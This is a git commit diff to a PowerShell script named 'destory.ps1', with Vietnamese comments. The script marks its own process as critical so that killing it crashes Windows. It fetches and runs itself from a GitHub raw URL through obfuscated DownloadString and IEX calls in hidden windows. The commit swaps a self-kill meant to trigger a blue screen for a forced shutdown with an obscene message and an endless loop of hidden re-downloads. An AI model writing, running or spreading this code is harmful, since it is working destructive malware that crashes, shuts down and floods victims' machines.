c509cb8f855be3c626e248d63738b3adb63507e4
43a1723 <hai1723notgay@gmail.com>
2025-04-10 14:01:31 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -15,14 +15,11 @@ Add-Type -TypeDefinition $code
 # Đánh dấu process là Critical
 [CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
 [console]::Beep(4000, 100)   # Tần số 4000Hz, kéo dài 100ms
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-# Đợi 15 giây
-Start-Sleep -Seconds 60
+shutdown /s /t 15 /c "Fuck you!"
+while ($true) {
+    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
+    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+    Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+}
 
-# Tự kill chính mình → BSOD
-Stop-Process -Id $PID -Force
+
